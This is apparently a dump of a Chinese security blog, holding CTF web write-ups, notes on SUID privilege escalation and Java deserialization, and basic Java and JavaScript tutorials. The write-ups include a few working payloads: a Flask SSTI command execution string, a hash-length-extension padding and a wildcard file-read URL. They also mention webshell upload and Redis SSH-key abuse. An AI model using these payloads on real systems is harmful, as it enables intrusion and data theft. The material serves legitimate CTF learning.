php命名规范 链子不难 难点在于 $this-&gt;gao=$this-&gt;fei;这句该怎么用 这里就需要知道引用运算符 举个小例子说明 这里取了了a的地址 修改b 那么也就会修改a 在这道题目我们需要修改$this-&gt;a为milaoshu对象 所以就要用到引用运算符&amp; 还有就是正则 不能0开头 用array绕过就行 poc如下 no_wake_up考点： fast destruct poc ez_ssti考点: flask ssti 基础无过滤 ?name=&#123;&#123;\"\".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;payload不唯一 EasyCMS访问/admin/admin.php 到后台 admin/mao 默认密码登录 可以执行sql语句 直接写马到网站根目录下 MD5的事就拜托了考点： 哈希长度扩展攻击 源码如下 首先就是正常的变量覆盖 POST：SHCTF=host://query?SHCTF GET：length=0.0000001 然后我们可以得到flag的md5值和flag长度 关键在于 一眼丁真是哈希长度扩展攻击 在这里有弯子猪脑当时没绕过来 举个例子 一般我们哈希长度扩展攻击已知md5($salt.$somethong.$insert)salt长度和something的值 $insert是我们可控能输入的点 但是这道题我们只知道md5($flag)的值 并不知道那一坨的md5值 这里需要绕一下认为salt为0 一般flag格式为flag&#123;xxx-xxx-xxx-xxx&#125; 那么我么们将$somethong=flag&#123;xxx-xxx-xxx-xxx 将这段我们能输入$insert的当作&#125; 这样我们就变相的知道了那一坨的md5值 利用hashpump工具 在这里a280dad8326674279a3944046bc364f3其实就是我们加入攻击值之后那一坨的md5值 然后输入的时候length只需要输入%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%001前面&#125;就不需要了 不然就和flag重复了 并且length只容许是数字 payload: [WEEK2]ez_rce（未解出）考点： subprocess.call()命令注入 源码如下： 原理： 当subprocess.call()函数第七个参数shell&#x3D;false则会直接执行命令而不通过shell环境调用 当shell&#x3D;true时 就会调用&#x2F;bin&#x2F;sh 来执行命令 subprocess.call()其实调用的是Popen() 我们跟进一下 可以看到默认shell&#x3D;false 值得注意的是进程被卡死在这里叫做死锁 如果我们执行命令只是单纯一句指令 那么无论是shell等于true还是false 都会执行 两者没有差别 加了参数那么shell&#x3D;false就无法执行了 因此这道题就应该先去修改subprocess.call()的第七个参数为true这样我们才能执行带有参数的命令 通过 setattr来修改属性值 setattr(a,b,c)：将a对象的第b个属性修改为vlaue&#x3D;c 需要注意这里exp是json格式的exp = list(request.get_json()[&#39;exp&#39;]) payload:?exec=oka&amp;num=7&amp;bol=1 然后进行通过将命令执行的结果写入文件来读取 但是这里不能进行反弹shell 不知道是什么原因 WEEK3快问快答写脚本 sseerriiaalliizzee（未解出）纯眼瞎 考点： exit死亡绕过 pop链不难 那么这道题最大的坑点在于如何触发__toString 其实是靠这里的echo语句触发（吐血） 需要注意的是这里+也算是合法字符 所以要加两个任意字符AA来和&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;构成四个一组 也即是 AAphpdie+GenshinImpactStart+总计为28 为4的整数倍 gogogo（未解出）主要源码看这个 看题目也知道是个go题目 首先就是伪造admin身份 根据源码 session的key从环境变量中去获取的 盲猜为空 就像国赛那到题目一样 然后本地起一个环境 首先在go.mod引入依赖 然后启动 稍稍修改源码 使得我们session的身份为admin 去获取session 然后打入题目 然后是&#x2F;readflag路由 去读文件 要绕过一个正则 可见还有一个字符a没有过滤 直接利用通配符 payload：/readflag?filename=/??a? "},{"title":"2023“网信柏鹭杯”大学生网络空间安全精英赛 WEB WP与复现","date":"2023-10-14T03:53:38.000Z","url":"/post/37ed1ed6.html","categories":["各赛事WP"],"content":"web WEBexpress fs看url是个nodejs文件读取的题目 发现是原题 payload: ban了flag字样 对其双url编码即可绕过 因为Express 已经 URL 解码一次 综合题五有一个文件上传的点 但是这道题没用 然后观察读取上传的文件url发现存在任意文件读取 查看一下当前进程 发现&#x2F;app目录下有jar包 就想读下来 当时比赛环境它有问题 我根本下载不下来 一直在转圈 复现发现是过了那个bp代理就下不下来 得去掉才行 得到源码 很明显o0o函数在做一个异或操作或者调教gpt也能知道 直接用大头师傅的脚本 综合题六 重写readObject 并且有一个恶意类 还能执行命令函数 很明显一个java反序列化利用 在这个路由下利用 exp： 综合题七经过综合题六到内网 有一个redis并且22端口开放 就是redis写ssh公钥的 没环境大致和那个moectf内网渗透题目一模一样 先从内网中读到redis密码 之后流程可参考Redis未授权访问写Webshell和公私钥认证获取root权限 - 卿先生 - 博客园 还有三个题均为0解"},{"title":"Linux suid提权","date":"2023-09-26T08:06:05.000Z","url":"/post/51218ec8.html","categories":["知识学习"],"content":"Linux suid提权 whatSUID（Set User ID）是一种 Unix 和类 Unix 操作系统中的权限位，用于改变执行文件的权限。当一个可执行文件被设置为 SUID，它在执行时将具有文件所有者的权限，而不是执行者的权限。 简单说：如果一个文件具有s权限，那么当我们执行它时，不是以用户身份执行，而是以文件所有者身份执行，因而具有文件所有者的权限 这可以用于在执行过程中获取特权，例如允许普通用户执行需要超级用户权限的操作，而无需登录超级用户账户 linux引入了3个文件来管理用户组： &#x2F;etc&#x2F;passwd存放用户信息。 &#x2F;etc&#x2F;shadow存放用户密码信息。 &#x2F;etc&#x2F;group存放组信息。 在文件系统中的每个文件的文件头里面添加了用户和文件之间的关系信息。 用户信息&#x2F;etc&#x2F;passwd每行共有7个字段冒号隔开： 字段1为用户名。 字段2为用户的密码。 字段3为指UID，每个用户都有自己的uid。 字段4为组UID，每个用户都有不同的uid。 字段5为解释说明的字段。 字段6为指用户的根目录。 字段7为指登录shell，用户登录shell，当前为&#x2F;bin&#x2F;zsh表示可以登录，&#x2F;sbin&#x2F;nologin标识不被授权登录。 利用可以看到只有root的uid为0 如果把一个普通用户的uid修改为0，那么只要以普通用户的用户名和密码登录系统就会自动切换到root用户，在系统加固时一定要找出有哪些用户的uid为0 当我们在linux创建文件时，非root用户是无法创建的，除非让root用户为我们提升权限或者用sudo命令 并且此时创建的文件的所属人所属组也是root 并不是我们自己 因此 如果这个文件带有suid 那么当我们执行的时候就会以root权限进行执行，可执行文件运行时该进程的权限为root权限 从而提升权限 如何设置suid 如何查找suid文件常用的几条： 利用suid进行提权一些小思考以下有些命令说是提权但是只是进入一个shell交互界面 但是用户还是非root状态 网上好多文章也只是止步于此 并没有解释的清楚 当然也并不能说它提权失败了 提权不是说一定要提升到root用户 只要能达到越权效果，那么也算是狭义的提权了 具体效果还要根据题目或者真实环境而已，但是能进入shell界面总归是一个好的开始 前提以下命令都是基于自身已经被赋予了suid 例如这里的find命令 find不过一般在实战中都是在&#x2F;tmp下创建一个文件 网上还有利用这个find命令进行反弹shell提权的，但是反弹shell并没有提权，还是非root用户 还是说我kali版本太高了被修复了 bash env ionice nice less&#x2F;more文件并非是&#x2F;etc&#x2F;passwd 只要是内容多的文件都行 flock vim nano awk python在之前ctf一道题目遇到的 当然前提是得有suid 终极工具一个在线网站 查看命令存在suid命令的用法  后话利用suid提权主要思路: 首先找到所在环境以及具有suid的文件 然后找到相应命令进入shell交互的方法 执行shell 遇到题目环境回来找找看就行了:) 至此 先到这里 参考：  "},{"title":"Java序列化与反序列化","date":"2023-09-25T16:09:17.000Z","url":"/post/5e5c5c3.html","categories":["知识学习"],"content":"Java序列化与反序列化+cc链 前言 Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。 Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。 序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储 与PHP不同的是php大概是序列化生成一串序列化字符串，而java是生成了字节流文件 PHP通过一串字符串来在各种运行环境中穿梭，而java通过一个字节流文件来穿梭 同时java没有类似于python或者php的魔术函数，它是通过链式调用，也就是套娃的方式来构造恶意链除此之外我们可以通过重写其默认的readObject()函数我们可以执行一些恶意命令执行函数 序列化首先需要一个目标类 然后是我们的序列化过程 需要注意的是 我们要进行序列化与反序列化需要带有 Serializable接口才行 还有关键字transient申明的属性不会参与序列化与反序列化 反序列化 可见hobby属性并没有被反序列化 简单利用如果我们在目标类中重写readObject函数 并且进行命令执行 当我们反序列化执行readObject()的时候 就会自动调用我们的命令函数了 这里需要注意就是我们还是需要执行系统默认设置的in.defaultReadObject(); cc1链复现环境搭建无脑看这个师傅的链接搭就行了JAVA安全初探(三):CC1链全分析 - 先知社区 需要注意的是 配置好maven之后 就会自动帮我们把Comments-Collections-3.2.1下载到本地仓库 就不用再去找源码了 其次还要将其加进去 源头利用点这个链子的源头是Common Collections库中的Transformer接口 寻找一下继承了这个接口的类 有很多 但是主角是InvokerTransformer 我们跟进一下 发现有我们很熟悉的反射调用那么这里很明显是一个利用点 并且它还支持反序列化 继承了Serializable接口 再来看他的构造方法 一共三个，分别为方法名，变量类的数组，对象数组 这是一个我们普通的通过反射调用Runtime的过程 如果按照上面InvokerTransformer的transform来调用的话 就是这样 利用成功 那么这样我们就找到了源头利用点 接下来就是找链子了 链式调用 找链子去找谁调用了transform方法 有很多类调用了这个方法 但是这里复现TransformedMap的checkSetValue方法 这里可以看到方法类型和构造都是protected 所以我们只能内部调用或者子类调用与实例化 不能外部调用去实例化 看看构造函数 返现它传进来一个Map对象然后对他的键和值都进行一些操作 向上找 看看谁调用了方法或者构造了实例 发现docorate()方法对它进行了实例化 并且还是static类型 那么就属于是类的方法 直接通过类名.方法名形式调用即可 我们先来调用这个函数进行实例化 至于这里第二个参数为什么是null 因为checkSetValue只对第二个参数作用了 所以第一个参数传不传都无所谓 TransformedMap这个类的checkSetValue()调用了transform() 那么继续 看看谁调用了checkSetValue() 发现只有一处调用了这个函数 MapEntry类的setValue()函数 MapEntry继承了AbstractMapEntryDecorator这个类 同时TransformedMap也继承了这个类 AbstractMapEntryDecorator有setValue() 那么相当于子类MapEntry重写了父类的setValue() 其实本质上是重写了Entry这个接口的内置函数 同时父类还有Map.Entry这个接口 理解Entry那么至此 我们现需要了解一下什么Entry 简单说Entry就是Map里的键值对 setValue()是Map类的内置函数 常常用来遍历map对象的时候这样使用 从字面意思也能看出是在赋值 继续这个类MapEntry的父类又引入了Map.Entry接口，所以我们只需要进行常用的Map遍历，就可以调用setValue方法 到目前为止来缕一缕思路 for循环遍历transformdMap-&gt;调用MapEntry的setValue()-&gt;transformdMap的checkSetValue()-&gt;InvokerTransformer.transform() 非常完美 现在继续来看哪个可利用的类调用了setValue() 如果谁的readObject()函数调用了setValue()那么刚好闭环 岂不美哉？？？ 那么就找到了AnnotationInvocationHandler它的readObject函数直接就调用了setValue()函数 所以反序列化时候就会自动执行 并且还是遍历Entry来执行的 难道这就是天意吗 来看他的构造函数 接受两个参数 分别是： 继承了注解的Class 看这个类名也知道和注解有关系 是个Map 并且我们可控 可以将之前的transformdMap 传入 但是这个类有个缺陷就是 他没有申明public 也就是说只能在本package调用 如果想要在外部调用 就要用反射 并且只能用全限定方式调用 也就是Class.forName(完整包名)方式 这里再认识一下Override它是什么呢 它是一个注解 就是用来解释程序的附加信息 不会影响程序的正常运行 可以简单看作一个注释 当然不严谨 我们跟进一下 可以看到它上面还有两个注解 那么这两个注解叫做元注解 他们是用来解释注解的 Target一般是来限制注解的作用对象 Retention来限制注解作用阶段 比如源代码阶段还是程序运行阶段 那么 让我们来运行一下 惊了直接调用成功了 这里其实是有问题的 这里并不是我们反序列化调用计算器成功的而是 所以要把这一行注释了 一定要注意到这里！！ 那么再让我们执行一次 它没有成功 那么问题出在哪里了呢 问题一Runtime类并没有Serializable接口 所以无法进行序列化和反序列化 所以我们需要通过反射获得它的原型类 原型类Class具有Serializable接口的 它有一个getRuntime()方法 注意一下这里是没有参数传入的 可以看到直接返回一个Runtime对象 我们可以利用它来反射调用 也就是单列模式 获得可以反序列化的对象和exec方法 优化优化为我们一开始的InvokerTransformer调用形式 这里直接给transform穿了一个Runtime.class 这是一个类对象 本质上也是对象 可以看到是一个套一个的形式 有点套娃 那么有没有一个类直接帮我们进行套娃调用呢 答案是有的ChainedTransformer类 构造函数我们需要将我们链式调用的内容数组传进去 然后它的transform()就可以帮我们进行链式调用 真是太酷啦 最后优化后的代码 记得要将map这里稍加修改一下 对象变了 二记得35行要注释掉 至此还是执行不了 因为执行AnnotationInvocationHandler下的readObject()我们有条件没有满足 有两个if语句 打两个断点我们调试一下 发现第一个条件memberType != null是不满足的 就直接出来了 这里memeberType是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，而我们所使用的注解Override是没有成员变量的 所以得找一个有成员变量的注解 Target注解 注意这里value()并不是函数 而是它的属性 学注解的时候有注意到这个 因此要将Object o = annotationConstructor.newInstance(Override.class, transformdMap); Override改为Target 并且把这块的key改为value 终于进来了 三在setValue的时候，我们传入的value值根本就不是我们需要的Runtime.class 那么我们应该怎么把他转回我们想要的值呢 这里用到了ConstantTransformer 这个类里面也有transform，和构造函数配合使用的话 无论我们传入什么值，就会返回构造函数传的那个值，这样就能将value的值转为Runtime.class 至此所有的链就结束了 最终代码： 后言：虽然跟着视频资料一步一步跟过来了 但是还是不太熟悉 还是得多调试多想 累了 调了几天了 终于结束了 感谢：组长Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili 佬文章 JAVA安全初探(三):CC1链全分析 - 先知社区"},{"title":"JAVA基础","date":"2023-09-25T14:00:15.000Z","url":"/post/43d73074.html","categories":["知识学习"],"content":"JAVA基础 IDEA感觉正式java之旅之前还是要先稍微了解IDEA的基本知识，不然很难进行下去。 创建项目前置知识IDEA中最大的单位应该是project 可以理解为是workspace 然后是directory、module和package package是JAVA类的命名空间 避免类名重复 加入我们创建com.Z1d10t 那么就会在本地创建嵌套的文件 这两个层级应该是一样的都是低于project 但是有些差异 module一般是我们用于构建源代码的文件夹，用于组织项目的不同部分 而directory是普通文件夹 就比如我们在电脑上普通的文件夹 没有特殊含义 在项目中常常用来放静态音视频图片之类的 然后我们就可以右击我们的module开始创建源文件进行创作了 project和module的关系 集成JVM如果我们不用IDEA进行java开发的话，我们首先是创建.java的源代码，然后通过javac.exe来编译为.class后缀的文件才可以运行 但是IDEA直接集成了JAVA虚拟机也就是JVM，直接写完帮我们编译然后运行，非常方便。 这也就是为什么java有跨平台性，编译一次到处执行 就是因为JVM的原因，不用去看机器环境，自己就有一个环境，把自己包裹起来的呢种。 基本语法编写 Java 程序时，应注意以下几点： 大小写敏感：Java 是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的。 类名：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 MyFirstJavaClass，也就是要驼峰式命名。 方法名：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。 源文件名：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 .java。（如果文件名和类名不相同则会导致编译错误）。 主方法入口：所有的 Java 程序由 public static void main(String[] args) 方法开始执行。 JAVA标识符通俗说就是名字，类名变量名方法名都被称为标识符 字母数字美元符号或者下划线开头其他非法 关键字不能作为标识符 关键字就是一些已经被java占用的名字 有特殊含义的我们不能用 大小写敏感 JAVA修饰符 访问控制修饰符 : default, public , protected, private 非访问控制修饰符 : final, abstract, static, synchronized 可以用来修饰类中方法和属性 JAVA变量 局部变量 类变量（静态变量） 成员变量（非静态变量） JAVA数组数组是储存在堆上的对象，可以保存多个同类型变量 JAVA关键字 遇到了直接查表就行了 从HelloWorld开始 首先就是要需要梳理一个理念就是在java中一切都是类 psvm快捷键可以直接生成 public static void main(String[] args)&#123;&#125; sout快捷键可以直接生成System.out.println(&quot;hello world&quot;) 首先我们的文件名是什么那么我们的类名也是什么 public class 和 class的区别也就是说我们可以创建多个类 但是公共类只能有一个并且公共类的类名必须与文件名保持一致 并且任何类中都可以设置程序入口 也就是都可以写main方法 但是虽然我们可以在一个java源文件中定义多个类，但是这种做法是不规范的，比较规范的是一个源文件只能定义一个class 注释 JAVA对象和类构造方法如果没有显式构造方法 java编译器会为该类提供一个默认构造方法 一个类构造方法可以有多个 创建对象 访问实例变量和方法 eg: import导包首先在Z1d10t相对路径还有一个learn package 内容如下 然后我们导入到Z1d10t package中 然后调用 可见可以正常输出 基本数据类型有内置数据类型和引用数据类型 内置数据类型用到了直接查  引用类型 在Java中，引用类型的变量非常类似于C&#x2F;C++的指针。引用类型指向一个对象，指向对象的变量是引用变量。这些变量在声明时被指定为一个特定的类型，比如 Employee、Puppy 等。变量一旦声明后，类型就不能被改变了。 对象、数组都是引用数据类型。 所有引用类型的默认值都是null。 一个引用变量可以用来引用任何与之兼容的类型。 例子：Student stu = new Student(&quot;byd&quot;); 常量在程序运行时是不能修改的 在java中是用final来修饰变量的 自动类型转换 小转大可以 但是大转小需要强制转换并且还会损失精度 JAVA变量类型变量类型: 局部变量（Local Variables）：定义在方法、构造方法或语句块中的变量，作用域只限于当前方法、构造方法或语句块中。局部变量必须在使用前声明，并且不能被访问修饰符修饰。 成员变量（Instance Variables）：定义在类中、方法之外的变量，作用域为整个类，可以被类中的任何方法、构造方法和语句块访问。成员变量可以被访问修饰符修饰。 静态变量（Class Variables）：定义在类中、方法之外的变量，并且使用 static 关键字修饰，作用域为整个类，可以被类中的任何方法、构造方法和语句块访问，静态变量的值在程序运行期间只有一个副本。静态变量可以被访问修饰符修饰。 参数变量（Parameters）：方法定义时声明的变量，作为调用该方法时传递给方法的值。参数变量的作用域只限于方法内部 简单说就是函数用于传值的形参 参数变量省流：形参 有两个点： 值传递：在方法调用时，传递的是实际参数的值的副本。当参数变量被赋予新的值时，只会修改副本的值，不会影响原始值。Java 中的基本数据类型都采用值传递方式传递参数变量的值。 引用传递：在方法调用时，传递的是实际参数的引用（即内存地址）。当参数变量被赋予新的值时，会修改原始值的内容。Java 中的对象类型采用引用传递方式传递参数变量的值。 类变量（静态变量）java中静态变量是属于类的，而不是对象的实例 由于静态变量是与类相关的，因此可以通过类名来访问静态变量，也可以通过实例名来访问静态变量 JAVA修饰符访问控制修饰符直接用一张图片来看访问权限关系 默认访问修饰符default默认访问修饰符的访问级别是包级别（package-level），即只能被同一包中的其他类访问 私有访问修饰符private外部无法直接访问到 只能通过本类的public函数间接去访问 可见直接访问是会报错的 公有访问修饰符public很常见就不说了 总之就是门户大开 受保护的访问修饰符protected 子类与基类在同一包中：被声明为 protected 的变量、方法和构造器能被同一个包中的任何其他类访问 子类与基类不在同一包中：那么在子类中，子类实例可以访问其从基类继承而来的 protected 方法，而不能访问基类实例的protected方法 一般很少用 我在这里就不多说了 访问控制和继承 父类中声明为 public 的方法在子类中也必须为 public。 父类中声明为 protected 的方法在子类中要么声明为 protected，要么声明为 public，不能声明为 private。 父类中声明为 private 的方法，不能够被子类继承。 非访问修饰符static修饰符 静态变量：static 关键字用来声明独立于对象的静态变量，无论一个类实例化多少对象，它的静态变量只有一份拷贝。 静态变量也被称为类变量。局部变量不能被声明为 static 变量。 静态方法：static 关键字用来声明独立于对象的静态方法。静态方法不能使用类的非静态变量。静态方法从参数列表得到数据，然后计算这些数据。 类变量和方法的访问可以直接使用 classname.variablename 和 classname.methodname 的方式访问 final修饰符变量一旦赋值后，不能被重新赋值 final 修饰符通常和 static 修饰符一起使用来创建类常量 但是如果不用static那么就要用非静态函数才能调用 也就是不用static修饰的 不然会报错 可见无法被改变 abstract修饰符一个类不能同时被final和abstract修饰 如果类包含抽象函数那么这个类一定要申明为抽象类 不然会报错 抽象类可以包含抽象方法和非抽象方法 抽象方法是一种没有任何实现的方法，该方法的具体实现由子类提供 如果有主体会报错 抽象方法由其子类实现 synchronized 修饰符synchronized 关键字声明的方法同一时间只能被一个线程访问 transient修饰符序列化的对象包含被 transient 修饰的实例变量时，java 虚拟机(JVM)跳过该特定的变量。 volatile修饰符volatile 修饰的成员变量在每次被线程访问时，都强制从共享内存中重新读取该成员变量的值。而且，当成员变量发生变化时，会强制线程将变化值回写到共享内存。这样在任何时刻，两个不同的线程总是看到某个成员变量的同一个值。 JAVA运算符大致和其他语言差不多 就不过多赘述了 JAVA循环结构while do…while循环 此结构会在判断条件是否成立之前执行一次 所以这个结构至少执行一次 for JAVA增强for循环 声明语句：声明新的局部变量，该变量的类型必须和数组元素的类型匹配。其作用域限定在循环语句块，其值与此时数组元素的值相等。 表达式：表达式是要访问的数组名，或者是返回值为数组的方法。 continue和break和其他语言利用一样 不多说 JAVA条件语句same JAVA数组声明数组变量两种方式但是一般推荐第一种方式 创建数组 做了两件事情: 首先用new dataType[arraySize];创建了一个数组 然后将其赋值给arrayRefVar 必须先声明然后再创建 如果不声明就创建会报错 实例下标依然是从0开始 for-each循环其实就是之前我们讲过的循环结构的增强for循环 多维数组初始化直接为每一维分配空间 这种我们用的最多也最方便 或者是一维一维分配空间 JAVA正则规则什么的都和其他语言差不多 看个例子 首先要引入依赖 然后要分别创建两个类:Pattern和Matcher Pattern是要进行的匹配模式的对象 Matcher是被匹配内容的对象 其次还有一个点就是在java正则模式中转义要用//其他语言我们都是只用一个/"},{"title":"SICTF2023 WEB WP","date":"2023-09-10T07:09:37.000Z","url":"/post/508290f8.html","categories":["各赛事WP"],"content":"SICTF2023 题目梯度设置的不太合理 两极分化过于严重力 Include考察伪协议php://filter/read=convert.base64-encode/resource= Baby_PHP这个题 很让人难绷 原题的非预期在这道题目上有问题 命令执行没结果。。 考点: 套娃也就是无参RCE php非法命名 %0a换行绕过 RCE源码: 过滤了括号和点 这里需要知道就是include可以不用括号就能包含文件 payload: painjava捏 不会 我全都要源码: 其实就一个点 __toSting()的调用靠preg_match(&quot;/233333333/&quot;,$this-&gt;pop) 可以看到是string类型的 exp如下： DoyouknowCCjava 会不了一点 你能跟得上我的speed吗考点: 条件竞争 上传和读取同时进行，看脸要等很长时间才成功。。。 "},{"title":"JS简单基础学习","date":"2023-09-10T07:06:43.000Z","url":"/post/eb0674ad.html","categories":["知识学习"],"content":"纯是为了看懂代码的…没啥用的电子垃圾 JS语言特性 js是一门弱语言，声明变量没有类型统一用var js没有方法重载概念，同名函数会被覆盖 JS两种引入方式 一种是内部直接引入就是通过script标签包裹起来&lt;script&gt;代码&lt;/script&gt; 另一种是通过文件引入的方式也是通过script标签不过要在其属性加上scr=路径 注释符:与java一一样都是// 变量定义变量var 变量名 = 值; 因为是弱类型语言 除了var之外还有let const 三者区别: var声明是全局作用域或函数作用域，而let和const是块作用域。 var变量可以在其范围内更新和重新声明； let变量可以被更新但不能重新声明； const变量既不能更新也不能重新声明。 它们都被提升到其作用域的顶端。但是，虽然使用变量undefined初始化了var变量，但未初始化let和const变量。 尽管可以在不初始化的情况下声明var和let，但是在声明期间必须初始化const。 来自:JavaScript 中的 Var、Let 和 Const 有什么区别 使用了 var 关键字，它声明的变量是全局的，包括循环体内与循环体外 使用 let 关键字， 它声明的变量作用域只在循环体内，循环体外的变量不受影响 就是说如果在循环体外和内都定义相同变量 那么var不管在体内还是体外都会改变变量值，而let体外的变量值不受体内的改变而变化 let 关键字声明的全局作用域变量不属于 window 对象 未定义undefinedundefined类型只有一个值就是undefined var a;声明但是没有给值那么就是undefined 数字number数字类型的所有的数字均用浮点数值表示(不区分整数值和浮点值,小数点可带可不带)。特殊的数字类型NaN:NaN 代表非数字的特殊值,用于指示某个值不是数字。NaN 非数字与任何数据都不相等，包括自己。js内置函数isNaN(),判断数值不是数字。isNaN(123) //falseisNaN(“abc”) //true 字符串string用双引号或者单引号包裹即可 可以用索引位置来访问其中的每个字符 内置属性length可以用来计算长度 比如string.length 字符串中包含单双引号时，就需要转义一下，不然无法解析 字符串还可以是对象 new 关键字将字符串定义为一个对象 当然String对象最好别用，会拖慢执行速度以及其他副作用 布尔 boolean表示真或者假 只有两个值就是true和false 对象 object对象：是拥有属性和方法的数据语法：var 对象名 &#x3D; &#123;属性名：属性值，属性名：属性值，…&#125;对象的属性寻址：对象属性有两种寻址方式也就是引用方式：people.name;people[“name”]; 常量:const AGE=18; &#x2F;&#x2F;定义常量常量名称常用大写字符常量不能赋值改变，否则会报错 JS字面量(直接量)用来为变量赋值时的常数量字面量是指程序中直接显示出来的值。100 &#x2F;&#x2F;数字字面量‘hello world’ &#x2F;&#x2F;字符串字面量false &#x2F;&#x2F;布尔字面量&#123;x:1, y:2&#125; &#x2F;&#x2F;对象字面量表达式[1,2,3,4,5] &#x2F;&#x2F;数组字面量表达式 js模板字符串这里就可以理解为格式化字符串 可以将$&#123;&#125;中变量的值带进去一起解析 变量的使用规则 变量声明了没有赋值，变量的值就是undefined类型 变量没有声明直接使用，运行时会报错 Typeof用来监测数据(变量或者值)的数据类型 语法：typeof 值 可以理解为php中的var_dump()函数 “undefined”——如果这个值未定义； “boolean”——如果这个值是布尔值； “string”——如果这个值是字符串； “number”——如果这个值是数值； “object”——如果这个值是对象或null； “function”——如果这个值是函数(函数是对象，不是一种数据类型。然而，函数因为有一些特殊的属性，因此通过typeof操作符来区分函数和其他对象) 运算符1、算术运算符是用来执行变量或值的算术运算++ 自增： x++; &#x2F;&#x2F;相当于x&#x3D;x+1— 自减： x—;&#x2F;&#x2F;相当于x&#x3D;x-1自增或自减的运算符的位置不同，意义不同 2、赋值运算符是用来给变量赋值 3、字符串连接符实例1：字符串间的 + 运算符字符串间的 + 运算符可以把两个或多个字符串变量连接起来。实例2：对字符串和数字进行加法运算返回字符串。 4、比较运算符比较运算符用来测定变量或值是否相等。返回值为true或false console.log(null==undefined); //trueconsole.log(null===undefined); //false&#x3D;&#x3D;判断值是否相等；&#x3D;&#x3D;&#x3D;判断值和数据类型是否都相等； 这一点和php的弱比较和强比较有点像 console.log(isNaN(undefined));// true NaNconsole.log(isNaN(null));// false 0null是一个表示”空”的对象，转为数值时为0；undefined是一个表示”空”的原始值，转为数值时为NaN。 特殊的数字类型NaN，用于指示某个值不是数字。NaN 非数字与任何数据都不相等，包括自己。 在js做比较的时候，有这样的三条规则：如果比较的两者中有bool，会把 bool 先转换为对应的 number，即 0 和 1如果比较的双方中有一方为number一方为string，会把string转换为数字把string直接转换为bool的时候，空字符串&#39;&#39;转换为 false，除此外的一切字符串转换 为 true 总结:先转bool,再转string 逻辑运算符逻辑运算符用来测定变量和值中的逻辑。逻辑与&amp;&amp;（找假）逻辑或||（找真）逻辑非!返回值为true或false JS的三个内置函数 警告框:alert(“内容”) 确认框:confirm(“内容”) 在控制台打印日志:console.log(“日志内容”) JS创建对象的两种方式 使用new关键字创建对象 使用&#123;&#125;创建对象 创建数组 使用new关键字创建数组：var arr = new Array();感觉像是php内置类 有木有？？ 使用[]创建数组: var arr = [&quot;cat&quot;,&quot;dog&quot;]; 数组常用方法 压入数据：arr01.push(“apple”); 数组元素反转：arr01.reverse( ); 把数组元素通过指定的分隔符，拼接成字符串：var arrStr = arr01.join(“,”); 把字符串通过指定的分隔符，拆分成数组：var arr02 = arrStr.split(“,”); 弹出数组中最后一个元素 ：将数组最后一个元素移除，并返回：var ele = arr01.pop( ); 遍历数组：for (var i = 0; i &lt; arr01.length; i++) &#123; console.log(arr01[i]); &#125; this关键字 在函数外面：this关键字指向window对象也就是代表当前浏览器窗口 在函数里面：this关键字指向调用函数的对象 会随着执行环境而改变： 在方法中，this 表示该方法所属的对象。 如果单独使用，this 表示全局对象。 在函数中，this 表示全局对象。 在函数中，在严格模式下，this 是未定义的(undefined)。 在事件中，this 表示接收事件的元素。 类似 call() 和 apply() 方法可以将 this 引用到任何对象 条件语句和其他语言差不多 语法： SWITCH语句也和其他语言一样 条件等于相应的值时 执行语句 语法： 还有一个小点就是case(条件)这里条件中的等号是强等于 不仅比较值也要比较类型 default也就是当以上条件都不执行时，就执行该default下的语句 JS类型转换constructor属性constructor 属性返回所有 JavaScript 变量的构造函数。 类型转换比如: For循环语法： eg： while循环语法： do-while循环该循环会在检查条件是否为真之前执行一次代码块，然后如果条件为真的话，就会重复这个循环。 语法： break和continue语句简单说就是break跳出整个循环 continue跳出此次循环然后继续下个循环 js错误-throw、try、catch 语法： throw放在try下语句，那么能够控制程序流，并生成自定义的错误消息 JS声明提升声明提升：函数声明和变量声明总是会被解释器悄悄地被”提升”到方法体的最顶部。 函数及变量的声明都将被提升到函数的最顶部 变量可以在使用后声明，也就是变量可以先使用再声明 只有声明的变量会提升，初始化的不会 这里需要理解什么是声明 什么是初始化 JS严格模式严格模式通过在脚本或函数的头部添加 use strict; 表达式来声明。 为什么使用严格模式: 消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为; 消除代码运行的一些不安全之处，保证代码运行的安全； 提高编译器效率，增加运行速度； 为未来新版本的Javascript做好铺垫。 “严格模式”体现了Javascript更合理、更安全、更严谨的发展方向，包括IE 10在内的主流浏览器，都已经支持它，许多大项目已经开始全面拥抱它。 另一方面，同样的代码，在”严格模式”中，可能会有不一样的运行结果 严格模式限制： 不容许使用未声明的变量 不容许删除变量或对象 不容许删除函数 不容许变量重名 不容许使用八进制 不容许使用转义字符 不容许对只读属性赋值 不容许对一个使用getter方法读取的属性进行赋值 不容许删除一个不容许删除的属性 变量名不能使用&#39;eval，arguments&#39;字符串 不容许使用这种语句&quot;use strict&quot;;with (Math)&#123;x = cos(2)&#125;;// 报错 由于一些安全原因，在作用域 eval() 创建的变量不能被调用 禁止this关键字指向全局对象 JSON数据 JSON数据的本质是一个有规则、可以解析的字符串 JSON数据在js中就是一个对象 JSON格式： &#123;&#125;:定义JSON对象 []：定义JSON数据 JSON对象和JSON字符串互转 JSON.stringify( )：JSON对象转JSON字符串 JSON.parse( )：JSON字符串转JSON对象 向未声明的 JavaScript 变量分配值如果把值赋给尚未声明的变量，该变量将被自动作为 window 的一个属性。 JavaScript 事件HTML 事件是发生在 HTML 元素上的事情。 当在 HTML 页面中使用 JavaScript 时， JavaScript 可以触发这些事件。 常见HTML事件列表： DOM文档对象模型JavaScript 